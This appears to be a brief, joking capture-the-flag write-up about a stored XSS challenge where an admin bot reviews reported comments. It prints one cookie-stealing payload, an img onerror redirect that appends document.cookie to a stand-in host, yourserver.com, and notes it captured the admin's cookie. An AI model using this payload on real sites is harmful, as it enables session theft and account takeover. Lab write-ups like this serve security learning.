> xss (stored?)

So apparently when i press reprot admin, some guy in the back end just opens the site and review everything??? Thats like insane 25/8 support (25hours a day, 8 days a week, explaining the joke to future me)

![image](https://github.com/user-attachments/assets/86879cff-b63c-473d-a1e3-0148973fab38)

lets start commenting. Triggered an XSS somewhere, then the instance died. Now back with a new one with new tricks.

In the end i broke the site with this payload, cuz it keeps redirecting me. 

![image](https://github.com/user-attachments/assets/7a3a8063-c5d3-425c-9ee0-87fc7ff76140)

```<img src=x onerror="location.href='http://yourserver.com/?c='+document.cookie">```

but on the bright side, we got the admin's cookie by also redirectling the poor fella =)

![image](https://github.com/user-attachments/assets/33f5365f-67fe-4dd9-bf31-299e166318fb)



